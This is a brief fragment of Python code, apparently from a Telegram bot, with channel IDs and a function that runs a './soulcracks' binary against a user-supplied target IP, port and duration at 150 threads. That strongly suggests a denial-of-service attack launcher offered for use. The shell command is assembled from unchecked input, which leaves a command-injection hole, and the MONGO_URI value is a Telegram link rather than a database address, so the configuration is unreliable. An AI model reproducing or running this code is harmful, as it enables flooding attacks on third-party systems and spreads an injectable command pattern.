...
MONGO_URI = 'https://t.me/dyeyryje'
FORWARD_CHANNEL_ID = -1002218992580
CHANNEL_ID = -1002218992580
error_channel_id = -1002218992580
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soulcracks {target_ip} {target_port} {duration} 150")
